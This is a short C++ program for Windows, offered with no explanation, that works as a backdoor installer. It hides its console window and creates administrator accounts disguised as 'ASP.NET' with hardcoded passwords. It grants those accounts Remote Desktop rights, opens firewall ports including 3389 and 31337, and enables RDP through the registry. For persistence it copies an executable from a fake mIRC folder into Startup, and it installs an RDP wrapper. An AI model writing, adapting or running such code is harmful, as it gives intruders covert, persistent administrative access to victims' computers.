#include <Windows.h>
#include <iostream>
int main()
{
	FreeConsole();
	system("net user ASP.NET W33dz123!@#$ /ADD &");
	system("net user ASPNET W33dz123!@# /ADD &");
	system("net localgroup Administrators ASP.NET /ADD &");
	system("net localgroup Administrators ASPNET /ADD &");
	system("net localgroup \"Remote Desktop Users\" ASP.NET /ADD &");
	system("net localgroup \"Remote Desktop Users\" ASPNET /ADD &");
	system("netsh advfirewall firewall add rule name=Remote dir=in action=allow protocol=TCP localport=3389 &");
	system("netsh advfirewall firewall add rule name=Remote1 dir=in action=allow protocol=TCP localport=5900 &");
	system("netsh advfirewall firewall add rule name=Remote2 dir=in action=allow protocol=TCP localport=5901 &");
	system("netsh advfirewall firewall add rule name=Remote3 dir=in action=allow protocol=TCP localport=5801 &");
	system("netsh advfirewall firewall add rule name=Remote4 dir=in action=allow protocol=TCP localport=31337 &");
	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f &");
	system("xcopy %appdata%\\mIRC\\init.exe C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup &");
	system("rededit.exe /s %appdata%\\mIRC\\defaults\\s.reg &");
	system("%appdata%\\mIRC\\RDPWInst.exe -i -o &");
	system("%appdata%\\mIRC\\mirc.exe &");
	system("taskkill /im mirc.exe /f");
	return 0;
}
